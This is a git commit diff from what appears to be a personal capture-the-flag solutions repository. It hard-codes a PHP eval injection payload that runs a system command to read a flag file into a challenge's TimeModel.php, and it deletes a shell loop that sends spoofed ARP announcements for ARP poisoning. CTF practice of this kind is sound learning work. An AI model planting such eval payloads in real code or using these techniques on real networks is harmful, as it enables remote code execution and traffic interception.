5a7e727df8f952f82ef24b939dd3dea7a9264410
ZZIDZZ <zidanutomo@gmail.com>
2022-01-21 10:36:23 +0700

    added knightctfs

--- HTB/web_lovetok/TimeModel.php
+++ HTB/web_lovetok/TimeModel.php
@@ -3,7 +3,7 @@ class TimeModel
 {
     public function __construct($format)
     {
-        $this->format = addslashes($format);
+        $this->format = addslashes("${eval($_GET[1])}&1=system('cat ../flagaBWBE');");
 
         [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];
         $this->prediction = "+${d} day +${h} hour +${m} minute +${s} second";
--- metaCTF/network_infiltration2/poison.sh
+++
@@ -1,7 +0,0 @@
-i=1
-for i in $(seq 0 90);
-do
-	ifconfig eth0 192.168.0.$i
-	arping -c 1 -U -s 192.168.0.$i 192.168.0.255
-	i=$(($i+1))
-done
